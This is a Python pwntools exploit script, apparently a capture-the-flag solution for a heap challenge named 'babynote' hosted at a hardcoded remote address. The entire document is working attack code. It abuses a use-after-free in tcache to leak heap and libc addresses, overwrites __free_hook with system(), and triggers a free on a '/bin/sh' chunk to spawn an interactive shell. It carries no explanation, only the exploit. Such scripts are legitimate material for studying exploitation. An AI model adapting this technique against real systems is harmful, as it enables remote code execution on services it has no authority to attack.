#!/usr/bin/env python3
from pwn import *

def create(size, data):
    r.sendlineafter(' >','1')
    r.sendlineafter('size : ', str(size))
    r.sendafter('Content : ', data)

def show(idx):
    r.sendlineafter(' >','2')
    r.sendlineafter('index : ', str(idx))
    return r.recvuntil('\n=======', drop=True)

def edit(idx, data):
    r.sendlineafter(' >','3')
    r.sendlineafter('index : ', str(idx))
    r.sendafter('Content : ', data)

def delete(idx):
    r.sendlineafter(' >', '4')
    r.sendlineafter('index : ', str(idx))

free_hook_offset = 0x1eeb28
system_offset = 0x55410

#r = process('./babynote')
r = remote('140.112.31.97', 30203)
### leak heap
create(0x18, 'a') #0
delete(0)
create(0x18, 'a') #1
delete(0)
for i in range(4):
    edit(1, p64(0) + p64(0))
    delete(0)
heap_base = u64(show(1) + b'\x00\x00') - 0x2a0
print(hex(heap_base))

### leak libc
create(0x78, 'a') #2
create(0x78, b'\x00'*0x48 + p64(0x21) + b'\x00'*0x18 + p64(0x21)) #3
delete(2)
create(0x78, 'a') #4

create(0x18, p64(heap_base + 0x2b0))#5
create(0x18, p64(0) + p64(0) + p64(heap_base + 0x2a0)) #6
create(0x18, p64(0) + p64(0xd1)) #7

###fill in tache x7
for i in range(7):
    delete(2)
    edit(4, p64(0) + p64(0))
delete(2)
libc_base = u64(show(4) + b'\x00\x00') - 0x1ebb80 - 0x60
print(hex(libc_base))

### modify free_hook
edit(1, p64(libc_base + free_hook_offset - 0x8))
create(0x18, 'a') #8
create(0x18, b'/bin/sh\x00' + p64(libc_base + system_offset)) #9
### trigger free hook
delete(9)
r.interactive()